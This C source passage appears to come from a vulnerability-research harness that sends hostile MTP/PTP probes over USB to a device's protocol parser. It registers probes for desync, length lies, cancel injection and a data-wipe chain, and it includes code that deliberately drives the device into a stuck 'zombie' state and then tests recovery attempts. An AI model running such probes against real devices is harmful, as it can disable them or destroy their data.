    /* corpus v2 (escalation round) */
    reg("midstream_inject", p_midstream);
    reg("double_desync", p_double_desync);
    reg("length_lie_cmd", p_length_lie);
    reg("zombie_window", p_zombie_window);
    reg("param_count_abuse", p_param_count);
    /* corpus v3 (audit-directed decisive six — docs/MTP-AUDIT.md) */
    reg("capture_02ff_container", p_capture_02ff);
    reg("session_id_abuse", p_session_abuse);
    reg("zombie_alternation", p_zombie_alternation);
    reg("cancel_injection", p_cancel_injection);
    reg("ring_saturation", p_ring_saturation);
    reg("banded_unknowns_zombie", p_banded_unknowns);
    /* corpus v4 (SIC CANCEL control-transfer gate, word0 decode) */
    reg("cancel_control_gate", p_cancel_control_gate);
    /* corpus v5 (wipe-chain watch: latch -> ds session cancel -> usbsys
     * wipe FUN_000a3a40; queued-IN oracle + OUT TRB-starvation watch) */
    reg("cancel_wipe_watch", p_cancel_wipe_watch);
}


/* ------------------------------------------------------------------ */
/* --probe-zombie-recovery: trigger the 0x02FF zombie, then attempt    */
/* EVERY conceivable in-band recovery, each on a FRESH reconnect.      */
/* Live intel says only console-side reconnect works — prove it        */
/* exhaustively. Candidates needing a SESSIONLESS start use bare_open  */
/* (own libusb open + claim + the exported glue I/O callbacks), because */
/* configure_usb_device itself dies at opensession once zombied.        */

/* bare sessionless open: killall + claim, NO session (for the
 * --probe-zombie-recovery sessionless candidates). Same open_claimed
 * path the sessioned dev_open uses — one code path, no drift. */
static int bare_open(Dev *d)
{
    kill_imaging_trio();
    usleep(120000);
    if (open_claimed(d) == 0) {
        jr("bare_open\":\"ok (sessionless, own claim)\"");
        return 0;
    }
    jr("bare_open\":\"claim failed\"");
    return -1;
}

static void dev_close_any(Dev *d)
{
    if (d->open == 2) {
        libusb_release_interface(d->ptp_usb->handle, d->ptp_usb->interface);
        libusb_close(d->ptp_usb->handle);
        if (d->_bare_ctx) libusb_exit(d->_bare_ctx);
        if (d->params.cd_locale_to_ucs2 != (iconv_t)-1)
            iconv_close(d->params.cd_locale_to_ucs2);
        if (d->params.cd_ucs2_to_locale != (iconv_t)-1)
            iconv_close(d->params.cd_ucs2_to_locale);
        memset(d, 0, sizeof(*d));
        return;
    }
    dev_close(d);
}

/* one recovery candidate: fresh reconnect, candidate ops, health, close */
static int try_candidate(const char *cand, int sessionless,
                         uint16_t code, int nparam, const uint32_t *pv,
                         const char *cand_opname)
{
    Dev d;
    uint16_t health;
    int connected;

    jr("zombie_recovery\":{\"candidate\":\"%s\",\"sessionless\":%s",
       cand, sessionless ? "true" : "false");
    if (sessionless) {
        connected = (bare_open(&d) == 0);
        if (!connected) {
            jr("zombie_recovery_result\":\"%s\",\"outcome\":\"bare open "
               "failed (zombie may block even the claim/transport)\"", cand);
            return 0;
        }
    } else {
        connected = (dev_open(&d) == 0);
        if (!connected) {
            jr("zombie_recovery_result\":\"%s\",\"outcome\":\"fresh "
               "reconnect REJECTED at OpenSession (zombie persists across "
               "reconnect)\"", cand);
            return 0;
        }
    }
    if (!sessionless && code) {
        PTPContainer ptp;
        unsigned char *data = NULL;
        uint16_t rc;
        memset(&ptp, 0, sizeof(ptp));
        ptp.Code = code;
        ptp.Nparam = nparam;
        if (nparam > 0) ptp.Param1 = pv[0];
        if (nparam > 1) ptp.Param2 = pv[1];
        rc = ptp_transaction(&d.params, &ptp, PTP_DP_NODATA, 0, NULL, NULL);
        jr("zombie_cand_op\":\"%s\",\"resp_code\":\"0x%04x\"",
           cand_opname, rc);
        (void)data;
    }
    if (sessionless) {
        /* sessionless op: GetDeviceInfo / GetStorageIDs with NO session */
        PTPContainer ptp;
        unsigned char *data = NULL;
        unsigned int recvlen = 0;
        uint16_t rc;
        memset(&ptp, 0, sizeof(ptp));
        ptp.Code = code;                  /* 0x1001 or 0x1004 */
        ptp.Nparam = 0;
        rc = ptp_transaction(&d.params, &ptp, PTP_DP_GETDATA, 0, &data,
                             &recvlen);
        jr("zombie_cand_op\":\"%s\",\"resp_code\":\"0x%04x\",\"data_len\":%u",
           cand_opname, rc, recvlen);
        if (data) free(data);
        health = rc;
    } else {
        health = xfer(&d, "post-candidate health", OC_GETSTORAGEIDS, 0,
                      NULL, 1);
    }
    jr("zombie_recovery_result\":\"%s\",\"outcome\":\"%s\",\"health\":"
       "\"0x%04x\"", cand, health == RC_OK ? "RECOVERED" : "still-zombie",
       health);
    dev_close_any(&d);
    return health == RC_OK;
}

static int probe_zombie_recovery(void)
{
    Dev d;
    uint16_t health;
    int any_recovered = 0;
    static const uint32_t one = 1, dead = 0xdeadbeefu,
                          big = 0xFFFFFFFFu;

    /* 1. establish the zombie on one connection */
    if (dev_open(&d) < 0) {
        jr("zombie_recovery\":\"dev_open failed before trigger — device "
           "already zombied or absent\"");
        return 1;
    }
    (void)session_op(&d);
    (void)desync_getobject(&d, "GetObject desync (zombie trigger)", 1);
    health = xfer(&d, "post-trigger health", OC_GETSTORAGEIDS, 0, NULL, 1);
    jr("zombie_trigger\":\"desync sent\",\"health_after\":\"0x%04x\"}", health);
    dev_close(&d);
    if (health == RC_OK) {
        jr("zombie_recovery\":\"NOT zombied — trigger failed to induce "
           "0x02FF; recovery candidates moot this run\"");
        return 0;
    }
    sleep(1);

    /* 2. exhaustive in-band candidates, each on a FRESH reconnect */
    any_recovered |= try_candidate("double-open(1,1)", 0, OC_OPENSESSION, 1,
                                   &one, "OpenSession(1) after open");
    any_recovered |= try_candidate("open(id=0)", 0, OC_OPENSESSION, 1,
                                   &(uint32_t){0}, "OpenSession(0)");
    any_recovered |= try_candidate("open(id=0xdeadbeef)", 0, OC_OPENSESSION,
                                   1, &dead, "OpenSession(0xdeadbeef)");
    any_recovered |= try_candidate("open(id=max)", 0, OC_OPENSESSION, 1,
                                   &big, "OpenSession(0xFFFFFFFF)");
    any_recovered |= try_candidate("close(1)", 0, OC_CLOSESESSION, 1, &one,
                                   "CloseSession(1)");
    any_recovered |= try_candidate("close(0xdeadbeef)", 0, OC_CLOSESESSION,
                                   1, &dead, "CloseSession(0xdeadbeef)");
    any_recovered |= try_candidate("sessionless GetDeviceInfo", 1,
                                   OC_GETDEVICEINFO, 0, NULL,
                                   "GetDeviceInfo(sessionless)");
    any_recovered |= try_candidate("sessionless GetStorageIDs", 1,
                                   OC_GETSTORAGEIDS, 0, NULL,
                                   "GetStorageIDs(sessionless)");

    jr("zombie_recovery_verdict\":\"%s\"", any_recovered ?
       "AN IN-BAND RECOVERY WORKED (see candidate results)" :
       "NO in-band recovery exists; console-side reconnect required "
       "(proven exhaustively)");
    return any_recovered ? 0 : 1;
}

/* one hostile probe: fresh connect + session + probe + health + close */
static void run_probe(const char *name)
{
    Dev d;
    uint16_t rc2;
    probe_fn fn = NULL;
    int i;

    corpus_init();
    for (i = 0; i < n_probes; i++)
        if (strcmp(PROBES[i].name, name) == 0) fn = PROBES[i].fn;
    if (!fn) {
        fprintf(stderr, "unknown probe '%s' (--list)\n", name);
        exit(2);
    }
    if (dev_open(&d) < 0) {
        jr("probe\":\"%s\",\"HARD_ERROR\":\"dev_open failed\"", js(name));
        return;
    }
    (void)session_op(&d);
    fn(&d);
    rc2 = xfer(&d, "post-probe-health", OC_GETSTORAGEIDS, 0, NULL, 1);
    jr("probe\":\"%s\",\"post_health\":\"0x%04x\"", js(name), rc2);
    if (rc2 != RC_OK)
        jr("probe\":\"%s\",\"ANOMALY\":\"parser unhealthy after probe\"",
           js(name));
    (void)end(&d);
    dev_close(&d);
}

/* ------------------------------------------------------------------ */

static int self_test(void)
{
    int ok = 1;
    corpus_init();
    printf("  %-48s %s\n", "corpus v5 size (v1 14 + v2 5 + v3 6 + v4 1 + v5 1)",
           n_probes == 27 ? "PASS" : "FAIL");
    ok &= (n_probes == 27);
    printf("  %-48s %s\n", "opcode values",
           (OC_GETTHUMB == 0x100a && OC_GETOBJECT == 0x1009 &&
            OC_GETHANDLES == 0x1007) ? "PASS" : "FAIL");
    ok &= (OC_GETTHUMB == 0x100a && OC_GETOBJECT == 0x1009 &&
           OC_GETHANDLES == 0x1007);
    printf("  %-48s %s\n", "v1 prefix == mtp_probe.py corpus",
           (strcmp(PROBES[0].name, "getobjectinfo_handle_zero") == 0 &&
            strcmp(PROBES[6].name, "getobject_partial_nodata") == 0 &&
            strcmp(PROBES[13].name, "closesession_untidy") == 0)
           ? "PASS" : "FAIL");
    ok &= (strcmp(PROBES[0].name, "getobjectinfo_handle_zero") == 0 &&
           strcmp(PROBES[6].name, "getobject_partial_nodata") == 0 &&
           strcmp(PROBES[13].name, "closesession_untidy") == 0);
    printf("  %-48s %s\n", "v2 additions registered",
           (strcmp(PROBES[14].name, "midstream_inject") == 0 &&
            strcmp(PROBES[15].name, "double_desync") == 0 &&
            strcmp(PROBES[16].name, "length_lie_cmd") == 0 &&
            strcmp(PROBES[17].name, "zombie_window") == 0 &&
            strcmp(PROBES[18].name, "param_count_abuse") == 0)
           ? "PASS" : "FAIL");
    ok &= (strcmp(PROBES[14].name, "midstream_inject") == 0 &&
           strcmp(PROBES[15].name, "double_desync") == 0 &&
           strcmp(PROBES[16].name, "length_lie_cmd") == 0 &&
           strcmp(PROBES[17].name, "zombie_window") == 0 &&
           strcmp(PROBES[18].name, "param_count_abuse") == 0);
    printf("  %-48s %s\n", "v3 additions registered",
           (strcmp(PROBES[19].name, "capture_02ff_container") == 0 &&
            strcmp(PROBES[20].name, "session_id_abuse") == 0 &&
            strcmp(PROBES[21].name, "zombie_alternation") == 0 &&
            strcmp(PROBES[22].name, "cancel_injection") == 0 &&
            strcmp(PROBES[23].name, "ring_saturation") == 0 &&
            strcmp(PROBES[24].name, "banded_unknowns_zombie") == 0)
           ? "PASS" : "FAIL");
    ok &= (strcmp(PROBES[19].name, "capture_02ff_container") == 0 &&
           strcmp(PROBES[20].name, "session_id_abuse") == 0 &&
           strcmp(PROBES[21].name, "zombie_alternation") == 0 &&
           strcmp(PROBES[22].name, "cancel_injection") == 0 &&
           strcmp(PROBES[23].name, "ring_saturation") == 0 &&
           strcmp(PROBES[24].name, "banded_unknowns_zombie") == 0);
    printf("  %-48s %s\n", "v4 addition registered",
           strcmp(PROBES[25].name, "cancel_control_gate") == 0
           ? "PASS" : "FAIL");
    ok &= (strcmp(PROBES[25].name, "cancel_control_gate") == 0);
    printf("  %-48s %s\n", "v5 addition registered",
           strcmp(PROBES[26].name, "cancel_wipe_watch") == 0
           ? "PASS" : "FAIL");
    ok &= (strcmp(PROBES[26].name, "cancel_wipe_watch") == 0);
    printf("mtp_probe_libpt2 self-test: %s\n", ok ? "PASS" : "FAIL");
    return ok ? 0 : 1;
}

static void usage(void)
{
    fprintf(stderr,
        "usage: mtp_probe_libpt2 --baseline | --probe NAME | --suite | "
        "--list | --self-test\n"
        "                    --probe-zombie-recovery "
        "[--runs-dir DIR] [--wait SEC]\n"
        "corpus: v1 (14, == mtp_probe.py) + v2 (5) + v3 (6, audit-directed:\n"
        "  capture_02ff_container, session_id_abuse, zombie_alternation,\n"
        "  cancel_injection, ring_saturation, banded_unknowns_zombie)\n"
        "+ v4 (1: cancel_control_gate — SIC CANCEL control-transfer gate,\n"
        "  negative-control word0=0x4002 then the 0x4001 shot, one byte\n"
        "  apart, single connection; fires ONLY from a verified-clean state)\n"
        "+ v5 (1: cancel_wipe_watch — latch -> ds session cancel -> usbsys\n"
        "  wipe FUN_000a3a40: queue a data phase, fire 0x4001, oracle the\n"
        "  queued-IN bytes + watch OUT writes past the 20s timer)\n");
}

int main(int argc, char **argv)
{
    const char *runs_dir = NULL, *probe_name = NULL;
    int do_baseline = 0, do_suite = 0, do_list = 0, do_self = 0, wait_s = 0;
    int do_zombie_rec = 0;
    int i;
    char defdir[512];

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--baseline")) do_baseline = 1;
        else if (!strcmp(argv[i], "--suite")) do_suite = 1;
        else if (!strcmp(argv[i], "--list")) do_list = 1;
        else if (!strcmp(argv[i], "--self-test")) do_self = 1;
        else if (!strcmp(argv[i], "--probe-zombie-recovery")) do_zombie_rec = 1;
        else if (!strcmp(argv[i], "--probe") && i + 1 < argc)
            probe_name = argv[++i];
        else if (!strcmp(argv[i], "--runs-dir") && i + 1 < argc)
            runs_dir = argv[++i];
        else if (!strcmp(argv[i], "--wait") && i + 1 < argc)
            wait_s = atoi(argv[++i]);
        else { usage(); return 2; }
    }
    if (do_self) return self_test();
    corpus_init();
    if (do_list) {
        for (i = 0; i < n_probes; i++) printf("  %s\n", PROBES[i].name);
        return 0;
    }
    if (!do_baseline && !do_suite && !probe_name && !do_zombie_rec) {
        usage(); return 2;
    }

    if (!runs_dir) {
        const char *slash = strrchr(argv[0], '/');
        /* default: <tool dir>/../webkit-rig/runs (same as python) */
        if (slash && slash > argv[0]) {
            char tooldir[512];
            size_t n = (size_t)(slash - argv[0]);
            if (n >= sizeof(tooldir)) n = sizeof(tooldir) - 1;
            memcpy(tooldir, argv[0], n);
            tooldir[n] = 0;
            snprintf(defdir, sizeof(defdir), "%s/../webkit-rig/runs",
                     tooldir);
            runs_dir = defdir;
        } else {
            runs_dir = "tools/webkit-rig/runs";
        }
    }
    jr_open(runs_dir);

    if (wait_s) {
        /* claim the instant the device appears; keep the trio dead */
        libusb_context *ctx = NULL;
        uint8_t devnum = 0, busnum = 0;
        time_t deadline = time(NULL) + wait_s;
        if (libusb_init(&ctx) != LIBUSB_SUCCESS) return 2;
        while (time(NULL) < deadline) {
            kill_imaging_trio();
            if (find_console(ctx, &devnum, &busnum, 0)) {
                jr("wait\":\"device appeared, claiming\"");
                break;
            }
            usleep(200000);
        }
        libusb_exit(ctx);
    }

    if (do_baseline) {
        Dev d;
        if (dev_open(&d) < 0) return 1;
        baseline(&d);
        dev_close(&d);
    } else if (probe_name) {
        run_probe(probe_name);
    } else if (do_zombie_rec) {
        return probe_zombie_recovery();
    } else if (do_suite) {
        for (i = 0; i < n_probes; i++) {
            printf("[*] probe: %s\n", PROBES[i].name);
            run_probe(PROBES[i].name);
            sleep(1);        /* device may have torn down; settle */
        }
    }
    if (g_jr) fclose(g_jr);
    return 0;
}
